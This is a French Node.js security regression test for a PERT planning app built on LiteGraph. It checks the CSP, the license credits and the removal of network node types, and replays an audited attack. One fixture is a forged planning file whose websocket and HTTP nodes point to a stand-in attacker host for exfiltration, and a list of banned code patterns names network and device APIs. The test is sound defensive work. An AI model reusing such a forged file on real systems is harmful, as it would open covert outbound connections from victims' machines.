// Non-regression de securite — audit du 01/09/2026, constats C-01 a C-04.
//
// Ce que ce test protege, et pourquoi rien d'autre ne le protege :
//
//   C-01  LiteGraph ne se contente pas d'un canevas : le build complet embarque 156
//         types de noeuds inutilises (audio, MIDI, webcam, network/websocket...).
//         Or ouvrir un .pert reconstruit le graphe en instanciant TOUT type declare
//         DANS LE FICHIER. Un planning forge posant un noeud network/websocket
//         ouvrait donc une connexion sortante a la simple ouverture. Deux mesures
//         independantes referment le cas, et chacune est verifiee ici :
//           R1  lib/litegraph.core.js -- le build « coeur », sans bibliotheque de
//               noeuds : le code fautif n'est plus la ;
//           R2  une CSP « connect-src 'none' » dans le bundle : le NAVIGATEUR refuse
//               la sortie, quel que soit le code.
//   C-03  la licence MIT impose de conserver les mentions de copyright ; litegraph et
//         fflate n'en portent aucune dans leur build, d'ou le bloc injecte au build.
//
// Une regression ici serait INVISIBLE a l'usage : l'application marcherait exactement
// pareil. C'est tout l'objet de ce test -- et la raison pour laquelle le volet 5 rejoue
// le scenario d'attaque complet plutot que de se contenter de relire le fichier.
//
// PARTICULARITE : ce test vise le BUNDLE (dist/pertflow.html) et non index.html, parce
// que la CSP et les credits n'existent QUE la (injectes par scripts/build-bundle.js).
// Il vaut donc pour le bundle versionne : le regenerer avant, si les sources ont bouge.
//
// Usage : node tools/smoke-securite.js

const fs = require('fs');
const path = require('path');
const os = require('os');
const lib = require('./lib');

function assert(cond, msg) { if (!cond) throw new Error('ECHEC: ' + msg); }

// Planning FORGE : un planning valide d'apparence (une vraie tache, qui s'affiche),
// auquel on a ajoute deux noeuds natifs de LiteGraph a effet reseau. C'est la forme
// qu'aurait un fichier recu d'un tiers -- rien ne le distingue a l'ecran.
const PERT_FORGE = {
  version: '1.0',
  meta: { title: 'Planning fournisseur', t0: '2026-09-01', unit: 'j' },
  graph: {
    last_node_id: 3, last_link_id: 0, links: [], groups: [], config: {}, version: 0.4,
    nodes: [
      { id: 1, type: 'pert/activity', pos: [100, 100], size: [180, 90], flags: {}, order: 0,
        mode: 0, properties: { label: 'Etude', duration: 5, etp: 1, color: '#4A90D9' } },
      { id: 2, type: 'network/websocket', pos: [400, 100], size: [60, 20], flags: {}, order: 1,
        mode: 0, properties: { url: 'ws://collecte.exemple-attaquant.test:8099/exfil' } },
      { id: 3, type: 'network/httprequest', pos: [400, 200], size: [60, 20], flags: {}, order: 2,
        mode: 0, properties: { url: 'http://collecte.exemple-attaquant.test:8099/ping' } },
    ],
  },
};

(async () => {
  // ── 1) Sources : c'est bien le build « coeur » qui est reference (R1) ──────────
  const indexHtml = fs.readFileSync(path.join(lib.ROOT, 'index.html'), 'utf8');
  assert(indexHtml.indexOf('lib/litegraph.core.js') !== -1,
    'index.html doit charger lib/litegraph.core.js (build « coeur »)');
  assert(!fs.existsSync(path.join(lib.ROOT, 'lib', 'litegraph.js')),
    'lib/litegraph.js (build COMPLET) ne doit plus exister : il rouvrirait C-01');

  const bundle = fs.readFileSync(lib.BUNDLE, 'utf8');

  // ── 2) Le bundle porte la politique de securite (R2) ──────────────────────────
  const csp = (bundle.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/i) || [])[1];
  assert(csp, 'bundle : balise Content-Security-Policy absente');
  // La directive qui referme C-01. Les autres sont verifiees par leur seule presence
  // dans un default-src 'none' : c'est celle-ci qui porte l'interdiction de sortie.
  assert(/connect-src 'none'/.test(csp), "CSP : « connect-src 'none' » attendu (aucune sortie reseau)");
  assert(/default-src 'none'/.test(csp), "CSP : « default-src 'none' » attendu (tout interdit par defaut)");
  // 'unsafe-eval' rouvrirait l'evaluation de code : le bundle n'en a aucun besoin.
  assert(csp.indexOf('unsafe-eval') === -1, "CSP : 'unsafe-eval' ne doit JAMAIS y figurer");

  // ── 3) Mentions de licence des bibliotheques tierces (C-03) ───────────────────
  ['litegraph.js', 'jsPDF', 'fflate'].forEach(nom => {
    assert(bundle.indexOf(nom) !== -1, 'bundle : mention de licence manquante pour ' + nom);
  });
  assert(bundle.indexOf('Bibliotheques tierces') !== -1, 'bundle : bloc de credits absent');

  // ── 4) Le code fautif a bien disparu du fichier distribue (R1) ────────────────
  // On teste le BUNDLE et non lib/ : c'est lui qui circule, et c'est sur lui que la
  // DSI passera son propre outillage. Ces motifs venaient tous de la bibliotheque de
  // noeuds de LiteGraph, qui n'est plus embarquee.
  [
    ['new WebSocket', 'ouverture de socket'],
    ['getUserMedia', 'camera / microphone'],
    ['requestMIDIAccess', 'peripheriques MIDI'],
    ['registerNodeType("network/', 'noeuds reseau'],
  ].forEach(([motif, quoi]) => {
    assert(bundle.indexOf(motif) === -1,
      'bundle : « ' + motif + ' » (' + quoi + ') ne doit plus y figurer — build complet revenu ?');
  });

  // Aucune ressource chargee depuis le reseau (deja garanti par build-bundle.js, mais
  // c'est ici que la DSI le lira) : ni script, ni feuille de style, ni image externe.
  const externes = bundle.match(/(?:src|href)="(?:https?:)?\/\/[^"]+"/gi) || [];
  assert(externes.length === 0, 'bundle : ressource externe referencee — ' + externes.join(', '));

  // ── 5) Contre-epreuve a l'execution : le scenario C-01 rejoue en entier ───────
  const { browser, ctx, page } = await lib.launch();
  const ws = [], sorties = [], errors = [], violations = [];
  page.on('websocket', s => ws.push(s.url()));
  page.on('request', r => {
    const u = r.url();
    if (!u.startsWith('file://') && !u.startsWith('data:') && !u.startsWith('blob:')) sorties.push(u);
  });
  page.on('pageerror', e => errors.push('pageerror: ' + e.message));
  page.on('console', m => {
    if (m.type() !== 'error') return;
    if (/Content Security Policy/i.test(m.text())) violations.push(m.text());
    else errors.push('console.error: ' + m.text());
  });

  await lib.openBundle(page);

  // Seuls les 3 types de PertFlow doivent etre instanciables par un fichier. C'est la
  // mesure directe de R1 : 156 avant, 3 apres.
  const types = await page.evaluate(() => Object.keys(LiteGraph.registered_node_types).sort());
  assert(types.length === 3,
    '3 types de noeuds attendus (pert/*), vu ' + types.length + ' : ' + types.join(', '));
  types.forEach(t => assert(t.indexOf('pert/') === 0, 'type inattendu enregistre : ' + t));

  // Ouverture du planning forge par le chemin utilisateur normal (le bouton « Ouvrir »).
  const forge = path.join(os.tmpdir(), 'pertflow_smoke_securite.pert');
  fs.writeFileSync(forge, JSON.stringify(PERT_FORGE));
  await page.setInputFiles('#file-input', forge);
  await page.waitForTimeout(2500);   // large : une connexion sortante se verrait ici

  assert(ws.length === 0, 'CONNEXION SORTANTE ouverte par un .pert forge : ' + ws.join(', '));
  assert(sorties.length === 0, 'requete sortante declenchee par un .pert forge : ' + sorties.join(', '));

  // Le noeud inconnu doit etre INERTE, pas absent : LiteGraph le remplace par un noeud
  // vide pour ne pas perdre d'information. On verifie qu'il n'a aucun comportement, et
  // surtout que l'application continue de fonctionner normalement autour de lui.
  const etat = await page.evaluate(() => ({
    inconnus: window.pertGraph._nodes
      .filter(n => n.type.indexOf('pert/') !== 0)
      .map(n => ({ ctor: n.constructor.name, onExecute: typeof n.onExecute })),
    taches: window.pertGraph._nodes.filter(n => n.type === 'pert/activity').length,
    statut: (document.getElementById('status-nodes') || {}).textContent,
  }));
  etat.inconnus.forEach(n => {
    assert(n.ctor === 'LGraphNode', 'noeud inconnu instancie en ' + n.ctor + ' (attendu : LGraphNode vide)');
    assert(n.onExecute === 'undefined', 'noeud inconnu porteur d\'un onExecute : il s\'executerait');
  });
  assert(etat.taches === 1, 'la tache legitime du fichier doit rester lisible (vu ' + etat.taches + ')');
  assert(/1\s*t/i.test(etat.statut || ''), 'barre de statut incoherente apres ouverture : ' + etat.statut);

  // ── 6) La CSP ne casse rien : un export reel, de bout en bout ─────────────────
  // Le risque d'une CSP est de bloquer une fonction en SILENCE. On produit donc un
  // fichier pour de vrai, et on exige zero violation sur le parcours.
  const pert = JSON.parse(fs.readFileSync(path.join(lib.EXEMPLES, 'pert_a_exporter.pert'), 'utf8'));
  await page.evaluate(d => pertApplyProject(d), pert);
  const [dl] = await Promise.all([
    page.waitForEvent('download', { timeout: 15000 }),
    page.evaluate(() => {
      document.getElementById('btn-export').click();
      document.querySelectorAll('.export-format-row')[0].click();   // Image PNG
    }),
  ]);
  assert(/\.png$/i.test(dl.suggestedFilename()), 'export PNG attendu, vu ' + dl.suggestedFilename());

  assert(violations.length === 0, 'violation CSP sur un parcours normal : ' + violations.join(' | '));
  assert(errors.length === 0, 'erreurs : ' + errors.join(' | '));

  await ctx.close();
  await browser.close();

  console.log('OK securite : CSP posee (connect-src none), credits presents, '
    + types.length + ' types instanciables, .pert forge sans effet, export PNG produit.');
})().catch(e => { console.error(e.message); process.exit(1); });
